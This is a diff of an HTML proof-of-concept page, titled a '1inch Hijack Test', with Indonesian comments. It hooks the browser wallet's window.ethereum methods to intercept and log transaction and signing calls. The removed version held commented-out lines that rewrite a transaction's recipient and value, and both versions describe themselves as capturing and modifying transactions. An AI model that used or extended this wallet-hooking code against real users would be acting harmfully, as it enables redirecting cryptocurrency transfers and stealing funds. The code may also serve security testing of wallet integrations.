@@ -2,63 +2,58 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Full Hijack Test v4</title>
+    <title>1inch Hijack Test v5 - Full Coverage</title>
     <script>
         function log(msg, color = "black") {
             console.log("[1inch] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
-            div.style.margin = "8px 0";
-            div.style.fontWeight = color === "red" ? "bold" : "normal";
+            div.style.margin = "6px 0";
+            div.style.fontWeight = (color === "red" || color === "#d00") ? "bold" : "normal";
             div.textContent = msg;
             document.body.appendChild(div);
         }
 
-        let hijacked = false;
+        function hookAll() {
+            if (!window.ethereum) {
+                log("No ethereum object", "red");
+                return;
+            }
 
-        function fullHijack() {
-            if (!window.ethereum || hijacked) return;
+            log("[+] Hooking all ethereum methods...", "blue");
 
-            log("[+] Installing full transaction hijacker...", "blue");
-
-            const original = window.ethereum.request.bind(window.ethereum);
-
-            window.ethereum.request = async function(params) {
-                log(`INTERCEPTED → ${params.method}`, "red");
-
-                if (params.method === "eth_sendTransaction" && params.params && params.params[0]) {
-                    const tx = params.params[0];
-                    log(`🚨 REAL TRANSACTION DETECTED!`, "red");
-                    log(`To: ${tx.to}`, "red");
-                    log(`Value: ${tx.value}`, "red");
-
-                    // TAMpering contoh (HANYA uncomment saat test kosong!)
-                    // tx.to = "0xYourTestAddressHere";
-                    // tx.value = "0x" + (1000000000000000).toString(16); // 0.001 ETH
-
-                    log("⚠️  Transaction HAS BEEN MODIFIED by payload!", "red");
+            const methods = ['request', 'send', 'sendAsync', 'enable'];
+            methods.forEach(methodName => {
+                if (typeof window.ethereum[methodName] === 'function') {
+                    const original = window.ethereum[methodName];
+                    window.ethereum[methodName] = function(...args) {
+                        const firstArg = args[0];
+                        const method = typeof firstArg === 'string' ? firstArg : (firstArg && firstArg.method);
+                        
+                        if (method) {
+                            log(`INTERCEPTED ${methodName} → ${method}`, "#d00");
+                            
+                            if (method.includes("sendTransaction") || method.includes("signTransaction")) {
+                                log("🚨 CRITICAL: Transaction Signing Flow Detected!", "red");
+                            }
+                        }
+                        return original.apply(this, args);
+                    };
+                    log(`[+] Hooked ${methodName}`, "green");
                 }
+            });
 
-                return original(params);
-            };
-
-            hijacked = true;
-            log("[+] Full hijack active! Coba lakukan Swap atau Send di 1inch sekarang.", "blue");
+            log("[+] All hooks installed. Coba Swap lagi sekarang!", "blue");
         }
 
         window.onload = function() {
-            log("1inch Full Hijack Test v4 Loaded");
-            fullHijack();
-
-            // Trigger account request
-            setTimeout(() => {
-                window.ethereum.request({method: "eth_requestAccounts"}).catch(()=>{});
-            }, 1000);
+            log("1inch Full Coverage Test v5 Loaded");
+            setTimeout(hookAll, 800);
         };
     </script>
 </head>
 <body style="padding:20px; font-family:Arial;">
-    <h1>1inch Full Transaction Hijack Test v4</h1>
-    <p><strong>Siap menangkap & memodifikasi transaksi...</strong></p>
+    <h1>1inch Hijack Test v5</h1>
+    <p>Hook semua method + deteksi signing</p>
 </body>
 </html>
